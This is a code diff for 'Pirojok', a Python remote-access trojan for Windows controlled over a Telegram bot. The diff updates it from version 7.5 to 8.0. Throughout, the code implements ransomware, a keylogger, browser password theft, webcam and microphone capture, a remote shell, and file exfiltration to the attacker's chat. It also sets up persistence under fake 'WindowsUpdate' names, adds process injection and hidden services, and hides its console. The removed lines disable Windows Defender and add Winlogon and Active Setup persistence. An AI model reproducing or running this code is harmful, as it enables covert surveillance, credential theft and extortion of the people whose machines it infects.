-                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v TamperProtection /t REG_DWORD /d 0 /f',
-                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
-            ]
-            for cmd in commands:
-                self.run_as_admin_command(cmd)
-            return "[DEFENDER] Windows Defender disabled"
-        except Exception as e:
-            return f"[ERROR] {str(e)}"
-    
-    def add_firewall_rule(self, port, name="Pirojok"):
-        try:
-            if not self.admin_mode:
-                return "[ERROR] Need admin rights"
-            cmd = f'netsh advfirewall firewall add rule name="{name}" dir=in action=allow protocol=TCP localport={port}'
-            self.run_as_admin_command(cmd)
-            return f"[FW] Rule added for port {port}"
-        except Exception as e:
-            return f"[ERROR] {str(e)}"
-    
     def ransomware_start(self):
-        try:
-            if not self.admin_mode:
-                return "[ERROR] Need admin rights for ransomware"
-            result = self.ransom.start_ransomware()
-            return result
-        except Exception as e:
-            return f"[ERROR] {str(e)}"
+        if not self.admin_mode:
+            return "[ERROR] Need admin rights for ransomware"
+        return self.ransom.start_ransomware()
     
     def ransomware_key(self):
-        try:
-            if self.ransom.encryption_key:
-                key_b64 = base64.b64encode(self.ransom.encryption_key).decode()
-                # Return ONLY the key for easy copying
-                return key_b64
-            else:
-                return "[ERROR] No key generated (run ransomware first)"
-        except Exception as e:
-            return f"[ERROR] {e}"
+        if self.ransom.encryption_key:
+            return base64.b64encode(self.ransom.encryption_key).decode()
+        return "[ERROR] No key generated"
     
     def ransomware_decrypt(self, key_b64):
-        try:
-            result = self.ransom.decrypt_all(key_b64)
-            return result
-        except Exception as e:
-            return f"[ERROR] {str(e)}"
+        return self.ransom.decrypt_all(key_b64)
     
     def add_all_startup_methods(self):
         results = []
@@ -1502,6 +1018,7 @@ class Pirojok:
         else:
             exe_path = os.path.abspath(__file__)
         
+        # Registry HKCU
         try:
             key = winreg.HKEY_CURRENT_USER
             subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -1510,69 +1027,18 @@ class Pirojok:
             results.append("[OK] Registry HKCU")
         except: results.append("[FAIL] Registry HKCU")
         
-        try:
-            startup_folder = os.path.join(os.getenv('APPDATA'),
-                r'Microsoft\Windows\Start Menu\Programs\Startup')
-            vbs_script = f'''
-            Set oWS = WScript.CreateObject("WScript.Shell")
-            sLinkFile = "{startup_folder}\\WindowsUpdate.lnk"
-            Set oLink = oWS.CreateShortcut(sLinkFile)
-            oLink.TargetPath = "{exe_path}"
-            oLink.Save
-            '''
-            vbs_path = os.path.join(tempfile.gettempdir(), "create_shortcut.vbs")
-            with open(vbs_path, 'w') as f:
-                f.write(vbs_script)
-            subprocess.run(['cscript', vbs_path, '//nologo'], capture_output=True)
-            os.remove(vbs_path)
-            results.append("[OK] Startup folder")
-        except: results.append("[FAIL] Startup folder")
-        
+        # Task scheduler
         try:
             task_name = "WindowsUpdateTask"
             cmd = ['schtasks', '/create', '/tn', task_name, '/tr', f'"{exe_path}"',
                    '/sc', 'onlogon', '/rl', 'highest', '/f']
             subprocess.run(cmd, capture_output=True)
-            results.append("[OK] Task scheduler (logon)")
-        except: results.append("[FAIL] Task scheduler (logon)")
-        
-        if self.admin_mode:
-            try:
-                task_name = "WindowsUpdateSystem"
-                cmd = ['schtasks', '/create', '/tn', task_name, '/tr', f'"{exe_path}"',
-                       '/sc', 'onstart', '/ru', 'SYSTEM', '/rl', 'highest', '/f']
-                subprocess.run(cmd, capture_output=True)
-                results.append("[OK] Task scheduler (startup)")
-            except: results.append("[FAIL] Task scheduler (startup)")
-            
-            try:
-                key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
-                key = winreg.HKEY_LOCAL_MACHINE
-                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as regkey:
-                    try:
-                        current_shell, _ = winreg.QueryValueEx(regkey, "Shell")
-                    except:
-                        current_shell = "explorer.exe"
-                    if exe_path not in current_shell:
-                        new_shell = f"{exe_path}, {current_shell}"
-                        winreg.SetValueEx(regkey, "Shell", 0, winreg.REG_SZ, new_shell)
-                results.append("[OK] Winlogon Shell")
-            except: results.append("[FAIL] Winlogon Shell")
-            
-            try:
-                guid = str(uuid.uuid4())
-                key_path = f"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{guid}"
-                key = winreg.HKEY_LOCAL_MACHINE
-                with winreg.CreateKey(key, key_path) as regkey:
-                    winreg.SetValueEx(regkey, "StubPath", 0, winreg.REG_SZ, f'"{exe_path}"')
-                    winreg.SetValueEx(regkey, "Version", 0, winreg.REG_SZ, "1,0,0,0")
-                results.append("[OK] Active Setup")
-            except: results.append("[FAIL] Active Setup")
+            results.append("[OK] Task scheduler")
+        except: results.append("[FAIL] Task scheduler")
         
         return "\n".join(results)
     
     def remove_all_startup(self):
-        """Remove from all startup locations"""
         results = []
         
         try:
@@ -1585,139 +1051,38 @@ class Pirojok:
             results.append("[INFO] Not found in registry")
         
         subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateTask', '/f'], capture_output=True)
-        subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateSystem', '/f'], capture_output=True)
         results.append("[OK] Removed from task scheduler")
-        
-        if self.admin_mode:
-            try:
-                key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
-                key = winreg.HKEY_LOCAL_MACHINE
-                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as regkey:
-                    current_shell, _ = winreg.QueryValueEx(regkey, "Shell")
-                    if getattr(sys, 'frozen', False):
-                        exe_path = sys.executable
-                    else:
-                        exe_path = os.path.abspath(__file__)
-                    new_shell = current_shell.replace(f"{exe_path}, ", "").replace(f", {exe_path}", "")
-                    winreg.SetValueEx(regkey, "Shell", 0, winreg.REG_SZ, new_shell)
-                results.append("[OK] Removed from Winlogon Shell")
-            except:
-                results.append("[INFO] Not found in Winlogon Shell")
         
         return "\n".join(results)
     
     def check_startup(self):
-        """Check all startup locations for Pirojok entries"""
-        results = []
-        results.append("[STARTUP] Checking all locations:")
+        results = ["[STARTUP] Checking locations:"]
         
         try:
             key = winreg.HKEY_CURRENT_USER
             subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
             with winreg.OpenKey(key, subkey, 0, winreg.KEY_READ) as regkey:
                 try:
-                    value, _ = winreg.QueryValueEx(regkey, "WindowsUpdateSvc")
-                    results.append(f"[OK] Found in registry: {value}")
+                    winreg.QueryValueEx(regkey, "WindowsUpdateSvc")
+                    results.append("[OK] Found in registry")
                 except:
-                    results.append("[INFO] Not found in registry")
+                    results.append("[INFO] Not in registry")
         except:
             results.append("[INFO] Could not check registry")
-        
-        try:
-            startup_folder = os.path.join(os.getenv('APPDATA'),
-                r'Microsoft\Windows\Start Menu\Programs\Startup')
-            if os.path.exists(os.path.join(startup_folder, 'WindowsUpdate.lnk')):
-                results.append("[OK] Found in startup folder")
-            else:
-                results.append("[INFO] Not found in startup folder")
-        except:
-            results.append("[INFO] Could not check startup folder")
         
         try:
             result = subprocess.run(['schtasks', '/query', '/tn', 'WindowsUpdateTask'], 
                                    capture_output=True, text=True)
             if result.returncode == 0:
-                results.append("[OK] Found in task scheduler (logon)")
+                results.append("[OK] Found in task scheduler")
             else:
-                results.append("[INFO] Not found in task scheduler (logon)")
+                results.append("[INFO] Not in task scheduler")
         except:
-            results.append("[INFO] Could not check task scheduler (logon)")
+            results.append("[INFO] Could not check task scheduler")
         
-        try:
-            result = subprocess.run(['schtasks', '/query', '/tn', 'WindowsUpdateSystem'], 
-                                   capture_output=True, text=True)
-            if result.returncode == 0:
-                results.append("[OK] Found in task scheduler (system)")
-            else:
-                results.append("[INFO] Not found in task scheduler (system)")
-        except:
-            results.append("[INFO] Could not check task scheduler (system)")
-        
-        if self.admin_mode:
-            try:
-                key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
-                key = winreg.HKEY_LOCAL_MACHINE
-                with winreg.OpenKey(key, key_path, 0, winreg.KEY_READ) as regkey:
-                    current_shell, _ = winreg.QueryValueEx(regkey, "Shell")
-                    if getattr(sys, 'frozen', False):
-                        exe_path = sys.executable
-                    else:
-                        exe_path = os.path.abspath(__file__)
-                    if exe_path in current_shell:
-                        results.append("[OK] Found in Winlogon Shell")
-                    else:
-                        results.append("[INFO] Not found in Winlogon Shell")
-            except:
-                results.append("[INFO] Could not check Winlogon Shell")
-        
-        if self.admin_mode:
-            try:
-                key = winreg.HKEY_LOCAL_MACHINE
-                subkey = r"SOFTWARE\Microsoft\Active Setup\Installed Components"
-                found = False
-                i = 0
-                while True:
-                    try:
-                        guid = winreg.EnumKey(key, subkey, i)
-                        guid_key = os.path.join(subkey, guid)
-                        with winreg.OpenKey(key, guid_key, 0, winreg.KEY_READ) as gkey:
-                            stub, _ = winreg.QueryValueEx(gkey, "StubPath")
-                            if getattr(sys, 'frozen', False) and sys.executable in stub:
-                                found = True
-                                break
-                        i += 1
-                    except WindowsError:
-                        break
-                if found:
-                    results.append("[OK] Found in Active Setup")
-                else:
-                    results.append("[INFO] Not found in Active Setup")
-            except:
-                results.append("[INFO] Could not check Active Setup")
-        
-        results.append(self.hider.check_watchdog())
+        results.append(self.injector.check_status())
         
         return "\n".join(results)
-    
-    def check_and_restore(self):
-        """Check if everything is working after reboot"""
-        try:
-            issues = []
-            
-            if self.admin_mode:
-                startup_check = self.check_startup()
-                if "Found" not in startup_check:
-                    self.add_all_startup_methods()
-                    issues.append("Startup restored")
-            
-            test_shot = self.take_screenshot()
-            if not test_shot:
-                issues.append("Screenshot may not work")
-            
-            if issues:
-                self.send_message(self.owner_id, f"[RESTORE] Fixed: {', '.join(issues)}")
-        except:
-            pass
     
     def send_message(self, chat_id, text):
         try:
@@ -1726,9 +1091,7 @@ class Pirojok:
             
             url = f"{self.base_url}/sendMessage"
             data = {"chat_id": chat_id, "text": simple_text}
-            
             requests.post(url, data=data, timeout=10)
-            print(f"Sent: {text[:30]}...")
         except Exception as e:
             print(f"Send error: {e}")
     
@@ -1740,9 +1103,7 @@ class Pirojok:
             url = f"{self.base_url}/sendPhoto"
             files = {"photo": ("photo.jpg", photo_bytes, "image/jpeg")}
             data = {"chat_id": chat_id, "caption": simple_caption}
-            
             requests.post(url, files=files, data=data, timeout=30)
-            print(f"Photo sent: {caption[:30]}...")
         except Exception as e:
             print(f"Photo error: {e}")
     
@@ -1754,25 +1115,9 @@ class Pirojok:
             url = f"{self.base_url}/sendAudio"
             files = {"audio": ("recording.wav", audio_bytes, "audio/wav")}
             data = {"chat_id": chat_id, "caption": simple_caption}
-            
             requests.post(url, files=files, data=data, timeout=60)
-            print(f"Audio sent: {caption[:30]}...")
         except Exception as e:
             print(f"Audio error: {e}")
-    
-    def send_file(self, chat_id, file_bytes, filename, caption=""):
-        try:
-            timestamp = datetime.now().strftime('%H:%M:%S')
-            simple_caption = f"[{timestamp}] {caption}"
-            
-            url = f"{self.base_url}/sendDocument"
-            files = {"document": (filename, file_bytes)}
-            data = {"chat_id": chat_id, "caption": simple_caption}
-            
-            requests.post(url, files=files, data=data, timeout=60)
-            print(f"File sent: {filename}")
-        except Exception as e:
-            print(f"File error: {e}")
     
     def get_system_info(self):
         info = []
@@ -1782,7 +1127,7 @@ class Pirojok:
         info.append(f"Host: {socket.gethostname()}")
         info.append(f"User: {getpass.getuser()}")
         info.append(f"Admin: {'YES' if self.admin_mode else 'NO'}")
-        info.append(f"Mask: {'YES' if self.hider.masked else 'NO'}")
+        info.append(self.injector.check_status())
         try:
             info.append(f"IP: {requests.get('https://api.ipify.org', timeout=5).text}")
         except:
@@ -1810,139 +1155,85 @@ class Pirojok:
                 return None
     
     def on_system_startup(self):
-        """Actions on system startup with shutdown flag protection"""
         try:
-            # Check if this is a startup after our own shutdown
             if os.path.exists(self.shutdown_flag):
-                # This is a startup after we shut down - remove flag and DON'T notify
-                try:
-                    with open(self.shutdown_flag, 'r') as f:
-                        shutdown_time = f.read()
-                    print(f"Startup after shutdown at {shutdown_time} - silent mode")
-                except:
-                    pass
                 os.remove(self.shutdown_flag)
                 return
             
-            # Normal startup (not after our shutdown)
-            if os.path.exists(self.marker_file):
-                os.remove(self.marker_file)
-                return
-            
-            if self.started: 
-                return
-            
+            if self.started: return
             self.started = True
             
-            # Check and restore after reboot
-            threading.Timer(10.0, self.check_and_restore).start()
-            
-            # Send startup notification
             boot_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
             message = f"[PIROJOK] Started!\n"
             message += f"Boot time: {boot_time}\n"
             message += f"Host: {socket.gethostname()}\n"
             message += f"User: {getpass.getuser()}\n"
             message += f"Admin: {'YES' if self.admin_mode else 'NO'}\n"
-            message += f"Mask: {'YES' if self.hider.masked else 'NO'}"
+            message += self.injector.check_status()
             self.send_message(self.owner_id, message)
             
-            # Screenshot after boot
             time.sleep(5)
             screenshot = self.take_screenshot()
             if screenshot:
                 self.send_photo(self.owner_id, screenshot, "[SCREEN] Desktop after boot")
-            else:
-                self.send_message(self.owner_id, "[WARN] Screenshot failed after boot")
                 
         except Exception as e:
             print(f"Startup error: {e}")
     
     def self_destruct(self):
-        """Complete self-destruction of Pirojok"""
+        """Complete self-destruction"""
         try:
             results = []
             results.append("[SELF] Starting self-destruction...")
             
-            # 1. Remove from all startup locations
-            startup_result = self.remove_all_startup()
-            results.append(startup_result)
+            # Remove from startup
+            results.append(self.remove_all_startup())
             
-            # 2. Terminate all child processes
-            for proc in self.processes:
-                try:
-                    proc.terminate()
-                    time.sleep(0.1)
-                except:
-                    pass
-            results.append("[SELF] Child processes terminated")
-            
-            # 3. Stop keylogger if running
+            # Stop keylogger
             if self.spy.keylogger_active:
                 self.spy.stop_keylogger()
                 results.append("[SELF] Keylogger stopped")
             
-            # 4. Delete all temporary files
+            # Delete temp files
             temp_files = [
                 self.marker_file,
                 self.shutdown_flag,
-                self.hider.watchdog_file,
                 self.spy.keylog_file,
                 os.path.join(tempfile.gettempdir(), "pirojok_downloads"),
-                os.path.join(tempfile.gettempdir(), "pirojok_msg.bat"),
-                os.path.join(tempfile.gettempdir(), "pirojok_decrypted.bat"),
-                os.path.join(tempfile.gettempdir(), "restart_pirojok.bat"),
-                os.path.join(tempfile.gettempdir(), "restore_pirojok.bat"),
-                os.path.join(tempfile.gettempdir(), "watchdog.vbs"),
-                os.path.join(tempfile.gettempdir(), "watchdog_startup.vbs"),
-                os.path.join(tempfile.gettempdir(), "keylogger.vbs"),
-                os.path.join(tempfile.gettempdir(), "change_icon.ps1"),
-                os.path.join(tempfile.gettempdir(), "webcam.jpg"),
-                os.path.join(tempfile.gettempdir(), "recording.wav"),
                 os.path.join(tempfile.gettempdir(), "pirojok_ransom.html"),
             ]
             
-            deleted_files = 0
-            for file_path in temp_files:
+            deleted = 0
+            for f in temp_files:
                 try:
-                    if os.path.isfile(file_path):
-                        os.remove(file_path)
-                        deleted_files += 1
-                    elif os.path.isdir(file_path):
-                        shutil.rmtree(file_path)
-                        deleted_files += 1
-                except:
-                    pass
+                    if os.path.isfile(f):
+                        os.remove(f)
+                        deleted += 1
+                    elif os.path.isdir(f):
+                        shutil.rmtree(f)
+                        deleted += 1
+                except: pass
             
-            results.append(f"[SELF] Deleted {deleted_files} temporary files")
+            results.append(f"[SELF] Deleted {deleted} files")
             
-            # 5. Send farewell message
+            # Send farewell
             self.send_message(self.owner_id, "[SELF] Pirojok has eaten itself! Goodbye! 👋")
             
-            # 6. Self-destruct EXE file
+            # Self-destruct EXE
             if getattr(sys, 'frozen', False):
                 exe_path = sys.executable
                 bat_path = os.path.join(tempfile.gettempdir(), "self_destruct.bat")
-                
                 with open(bat_path, 'w') as f:
                     f.write(f'''@echo off
 timeout /t 3 /nobreak > nul
 del "{exe_path}"
-if exist "{exe_path}" (
-    del /f /q "{exe_path}"
-)
 del "%~f0"
 ''')
-                
                 subprocess.Popen(['cmd', '/c', bat_path], 
                                creationflags=subprocess.CREATE_NO_WINDOW)
-                
-                results.append("[SELF] EXE file scheduled for deletion")
+                results.append("[SELF] EXE scheduled for deletion")
             
-            # Print results to console
             print("\n".join(results))
-            
-            # Exit
             time.sleep(2)
             sys.exit(0)
             
@@ -1957,11 +1248,10 @@ del "%~f0"
         print(f"Command: {text}")
         
         if self.processing:
-            print("Already processing, skipping...")
             return
         
         if self.last_command == text and (datetime.now() - self.last_command_time).seconds < 2:
-            print(f"Duplicate command '{text}' ignored")
+            print(f"Duplicate command ignored")
             return
         
         self.processing = True
@@ -1969,98 +1259,96 @@ del "%~f0"
         self.last_command_time = datetime.now()
         
         try:
-            current_admin = self.check_admin()
-            if current_admin != self.admin_mode:
-                self.admin_mode = current_admin
-                print(f"Admin rights changed: {'YES' if self.admin_mode else 'NO'}")
-            
-            admin_commands = ["admin_cmd", "create_user", "enable_rdp", "disable_defender", 
-                             "add_rule", "task_startup", "explorer_shell", "active_setup", 
-                             "inject", "watchdog", "ransom", "ransom_start", "advanced_inject",
-                             "service_hide"]
-            
+            # Admin commands
+            admin_commands = ["inject", "service", "ransom", "ransom_start"]
             cmd_type = text.split()[0] if text else ""
             
             if cmd_type in admin_commands and not self.admin_mode:
-                self.send_message(chat_id, "[ADMIN] This command needs admin rights. Use 'admin' first")
+                self.send_message(chat_id, "[ADMIN] Need admin rights. Use 'admin' first")
                 self.processing = False
                 return
             
-            # === HELP / MENU ===
+            # HELP
             if text == "help" or text == "menu":
                 help_text = """
-🔥 PIROJOK 7.5 - ULTIMATE STEALTH SUITE 🔥
+🔥 PIROJOK 8.0 - PROCESS INJECTION 🔥
 
-[🎥] VIDEO/AUDIO:
-• webcam - take photo from webcam
+[💉] INJECTION:
+• inject - inject into system process
+• service - create hidden service
+• inject_status - check injection status
+
+[🎥] SPY:
+• webcam - take photo
 • mic [sec] - record microphone
-
-[📍] GEOLOCATION:
-• location - get location by IP
-• wifi - show Wi-Fi networks
-
-[🔑] DATA THEFT:
+• location - get location
 • passwords - steal browser passwords
-• clipboard - get clipboard content
+• clipboard - get clipboard
 • keylog_start - start keylogger
 • keylog_stop - stop keylogger
 • keylog_get - get keylog
 • keylog_clear - clear keylog
 
 [📁] FILES:
-• upload <path> - upload file from victim
-• download <url> [name] - download file to victim
-• downloads - list downloaded files
+• upload <path> - upload file
+• download <url> [name] - download file
+• downloads - list downloads
 
-[💻] REMOTE SHELL:
+[💻] SHELL:
 • shell <command> - execute command
 • history - command history
 
 [🔒] RANSOMWARE:
 • ransom - START RANSOMWARE!
 • ransom_key - show encryption key
-
-[🥷] STEALTH:
-• mask_status - show masquerade status
-• mask_remove - remove masquerade
-• inject - create service
-• advanced_inject - inject into process
-• service_hide - create hidden service
-• watchdog - enable self-recovery
+• ransom_decrypt <key> - decrypt files
 
 [💀] SELF DESTRUCT:
 • selfdestruct - Pirojok eats itself
 
 [⚡] POWER:
-• shutdown_now - shutdown immediately (no notification after)
-• reboot_now - reboot immediately
-• shutdown - shutdown in 5 sec (no notification after)
-• reboot - reboot in 5 sec
+• shutdown_now - shutdown (no notification)
+• reboot_now - reboot
 • abort - abort shutdown
 
 [👑] ADMIN:
 • admin - request admin rights
 • admin_check - check admin status
-• enable_rdp - enable RDP
-• disable_defender - disable Defender
 
 [🔄] STARTUP:
 • startup_reg - add to registry
-• startup_folder - add to startup folder
-• task_logon - task scheduler (logon)
-• task_startup - task scheduler (system)
+• task_logon - task scheduler
 • startup_remove_all - remove all
-• startup_check - check startup locations
+• startup_check - check startup
 
 [📸] BASIC:
-• shot - take screenshot
+• shot - screenshot
 • info - system info
                 """
                 self.send_message(chat_id, help_text)
                 self.processing = False
                 return
             
-            # === SPY COMMANDS ===
+            # INJECTION
+            if text == "inject":
+                result = self.cmd_inject()
+                self.send_message(chat_id, result)
+                self.processing = False
+                return
+            
+            if text == "service":
+                result = self.cmd_service()
+                self.send_message(chat_id, result)
+                self.processing = False
+                return
+            
+            if text == "inject_status":
+                result = self.cmd_inject_status()
+                self.send_message(chat_id, result)
+                self.processing = False
+                return
+            
+            # SPY
             if text == "webcam":
                 result = self.cmd_webcam()
                 self.send_message(chat_id, result)
@@ -2077,12 +1365,6 @@ del "%~f0"
             
             if text == "location":
                 result = self.cmd_location()
-                self.send_message(chat_id, result)
-                self.processing = False
-                return
-            
-            if text == "wifi":
-                result = self.spy.get_location()
                 self.send_message(chat_id, result)
                 self.processing = False
                 return
@@ -2123,7 +1405,7 @@ del "%~f0"
                 self.processing = False
                 return
             
-            # === FILE COMMANDS ===
+            # FILES
             if text.startswith("upload"):
                 parts = text.split(maxsplit=1)
                 if len(parts) == 2:
@@ -2147,12 +1429,12 @@ del "%~f0"
                 return
             
             if text == "downloads":
-                result = self.cmd_list_downloads()
+                result = self.cmd_downloads()
                 self.send_message(chat_id, result)
                 self.processing = False
                 return
             
-            # === REMOTE SHELL ===
+            # SHELL
             if text.startswith("shell"):
                 cmd = text[5:].strip()
                 if cmd:
@@ -2164,12 +1446,12 @@ del "%~f0"
                 return
             
             if text == "history":
-                result = self.cmd_shell_history()
+                result = self.cmd_history()
                 self.send_message(chat_id, result)
                 self.processing = False
                 return
             
-            # === RANSOMWARE ===
+            # RANSOMWARE
             if text == "ransom" or text == "ransom_start":
                 result = self.ransomware_start()
                 self.send_message(chat_id, result)
@@ -2192,115 +1474,42 @@ del "%~f0"
                 self.processing = False
                 return
             
-            # === STEALTH COMMANDS ===
-            if text == "mask_status":
-                self.send_message(chat_id, self.hider.get_mask_status())
-                self.processing = False
-                return
-            
-            if text == "mask_remove":
-                self.send_message(chat_id, "[MASK] Removing masquerade...")
-                self.hider.remove_masks()
-                self.processing = False
-                return
-            
-            if text == "inject":
-                result = self.hider.inject_into_system()
-                self.send_message(chat_id, result)
-                self.processing = False
-                return
-            
-            if text == "advanced_inject":
-                result = self.hider.advanced_inject()
-                self.send_message(chat_id, result)
-                self.processing = False
-                return
-            
-            if text == "service_hide":
-                result = self.hider.create_hidden_service()
-                self.send_message(chat_id, result)
-                self.processing = False
-                return
-            
-            if text == "watchdog":
-                result = self.hider.setup_watchdog()
-                self.send_message(chat_id, result)
-                self.processing = False
-                return
-            
-            # === SELF DESTRUCT ===
-            if text == "selfdestruct" or text == "self_destruct":
+            # SELF DESTRUCT
+            if text == "selfdestruct":
                 self.send_message(chat_id, "[SELF] Pirojok is eating itself... 🍽️")
                 threading.Thread(target=self.self_destruct, daemon=True).start()
                 self.processing = False
                 return
             
-            # === POWER COMMANDS WITH SHUTDOWN FLAG ===
+            # POWER
             if text == "shutdown_now":
-                # Create flag that this is our shutdown
                 with open(self.shutdown_flag, 'w') as f:
                     f.write(f"shutdown_at:{datetime.now().isoformat()}")
                 os.system("shutdown /s /f /t 0")
-                self.send_message(chat_id, "[SHUTDOWN] Shutting down NOW! (no notification after)")
+                self.send_message(chat_id, "[SHUTDOWN] Shutting down NOW!")
                 self.processing = False
                 return
             
             if text == "reboot_now":
-                # No flag for reboot - we want notification after
                 os.system("shutdown /r /f /t 0")
                 self.send_message(chat_id, "[REBOOT] Rebooting NOW!")
                 self.processing = False
                 return
             
-            if text == "shutdown":
-                # Create flag for delayed shutdown
-                with open(self.shutdown_flag, 'w') as f:
-                    f.write(f"shutdown_at:{datetime.now().isoformat()}")
-                os.system("shutdown /s /t 5")
-                self.send_message(chat_id, "[SHUTDOWN] Shutting down in 5 seconds...")
-                self.processing = False
-                return
-            
-            if text == "reboot":
-                # No flag for reboot
-                os.system("shutdown /r /t 5")
-                self.send_message(chat_id, "[REBOOT] Rebooting in 5 seconds...")
-                self.processing = False
-                return
-            
             if text == "abort":
                 os.system("shutdown /a")
-                # If abort succeeds, remove shutdown flag
                 if os.path.exists(self.shutdown_flag):
                     os.remove(self.shutdown_flag)
                 self.send_message(chat_id, "[ABORT] Shutdown aborted")
                 self.processing = False
                 return
             
-            # === BASIC ===
-            if text == "shot":
-                self.send_message(chat_id, "[CAM] Taking screenshot...")
-                screenshot = self.take_screenshot()
-                if screenshot:
-                    self.send_photo(chat_id, screenshot, "[SCREEN] Screenshot")
-                else:
-                    self.send_message(chat_id, "[ERROR] Failed to take screenshot")
-                self.processing = False
-                return
-            
-            if text == "info":
-                self.send_message(chat_id, self.get_system_info())
-                self.processing = False
-                return
-            
+            # ADMIN
             if text == "admin":
                 if self.admin_mode:
                     self.send_message(chat_id, "[ADMIN] Already have admin rights!")
                 else:
-                    self.send_message(chat_id, "[ADMIN] Requesting rights...")
-                    result = self.request_admin()
-                    if result:
-                        self.send_message(chat_id, result)
+                    self.request_admin()
                 self.processing = False
                 return
             
@@ -2310,19 +1519,7 @@ del "%~f0"
                 self.processing = False
                 return
             
-            if text == "enable_rdp":
-                result = self.enable_rdp()
-                self.send_message(chat_id, result)
-                self.processing = False
-                return
-            
-            if text == "disable_defender":
-                result = self.disable_defender()
-                self.send_message(chat_id, result)
-                self.processing = False
-                return
-            
-            # === STARTUP ===
+            # STARTUP
             if text == "startup_reg":
                 if getattr(sys, 'frozen', False):
                     exe_path = sys.executable
@@ -2333,33 +1530,7 @@ del "%~f0"
                     subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                     with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                         winreg.SetValueEx(regkey, "Pirojok", 0, winreg.REG_SZ, f'"{exe_path}"')
-                    self.send_message(chat_id, "[OK] Added to registry (HKCU\\Run)")
-                except Exception as e:
-                    self.send_message(chat_id, f"[ERROR] {e}")
-                self.processing = False
-                return
-            
-            if text == "startup_folder":
-                if getattr(sys, 'frozen', False):
-                    exe_path = sys.executable
-                else:
-                    exe_path = os.path.abspath(__file__)
-                try:
-                    startup_folder = os.path.join(os.getenv('APPDATA'),
-                        r'Microsoft\Windows\Start Menu\Programs\Startup')
-                    vbs_script = f'''
-                    Set oWS = WScript.CreateObject("WScript.Shell")
-                    sLinkFile = "{startup_folder}\\Pirojok.lnk"
-                    Set oLink = oWS.CreateShortcut(sLinkFile)
-                    oLink.TargetPath = "{exe_path}"
-                    oLink.Save
-                    '''
-                    vbs_path = os.path.join(tempfile.gettempdir(), "create_shortcut.vbs")
-                    with open(vbs_path, 'w') as f:
-                        f.write(vbs_script)
-                    subprocess.run(['cscript', vbs_path, '//nologo'], capture_output=True)
-                    os.remove(vbs_path)
-                    self.send_message(chat_id, "[OK] Added to startup folder")
+                    self.send_message(chat_id, "[OK] Added to registry")
                 except Exception as e:
                     self.send_message(chat_id, f"[ERROR] {e}")
                 self.processing = False
@@ -2376,26 +1547,7 @@ del "%~f0"
                            '/sc', 'onlogon', '/rl', 'highest', '/f']
                     result = subprocess.run(cmd, capture_output=True, text=True)
                     if result.returncode == 0:
-                        self.send_message(chat_id, "[OK] Added to task scheduler (logon)")
-                    else:
-                        self.send_message(chat_id, f"[ERROR] {result.stderr}")
-                except Exception as e:
-                    self.send_message(chat_id, f"[ERROR] {e}")
-                self.processing = False
-                return
-            
-            if text == "task_startup" and self.admin_mode:
-                if getattr(sys, 'frozen', False):
-                    exe_path = sys.executable
-                else:
-                    exe_path = os.path.abspath(__file__)
-                try:
-                    task_name = "PirojokSystem"
-                    cmd = ['schtasks', '/create', '/tn', task_name, '/tr', f'"{exe_path}"',
-                           '/sc', 'onstart', '/ru', 'SYSTEM', '/rl', 'highest', '/f']
-                    result = subprocess.run(cmd, capture_output=True, text=True)
-                    if result.returncode == 0:
-                        self.send_message(chat_id, "[OK] Added to task scheduler (system)")
+                        self.send_message(chat_id, "[OK] Added to task scheduler")
                     else:
                         self.send_message(chat_id, f"[ERROR] {result.stderr}")
                 except Exception as e:
@@ -2415,8 +1567,25 @@ del "%~f0"
                 self.processing = False
                 return
             
+            # BASIC
+            if text == "shot":
+                self.send_message(chat_id, "[CAM] Taking screenshot...")
+                screenshot = self.take_screenshot()
+                if screenshot:
+                    self.send_photo(chat_id, screenshot, "[SCREEN] Screenshot")
+                else:
+                    self.send_message(chat_id, "[ERROR] Failed to take screenshot")
+                self.processing = False
+                return
+            
+            if text == "info":
+                self.send_message(chat_id, self.get_system_info())
+                self.processing = False
+                return
+            
             self.send_message(chat_id, f"[ERROR] Unknown command: '{text}'. Use help")
             self.processing = False
+            
         except Exception as e:
             print(f"Error: {e}")
             self.processing = False
@@ -2426,7 +1595,7 @@ del "%~f0"
         while self.running:
             try:
                 url = f"{self.base_url}/getUpdates"
-                params = {"offset": self.last_update_id + 1, "timeout": 30, "allowed_updates": ["message"]}
+                params = {"offset": self.last_update_id + 1, "timeout": 30}
                 response = requests.get(url, params=params, timeout=35)
                 data = response.json()
                 if data["ok"] and data["result"]:
@@ -2451,7 +1620,9 @@ del "%~f0"
             self.send_message(self.owner_id, "[PIROJOK] Stopped")
 
 if __name__ == "__main__":
+    # Скрываем консоль
     if platform.system() == "Windows":
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    
     pirojok = Pirojok()
     pirojok.run()
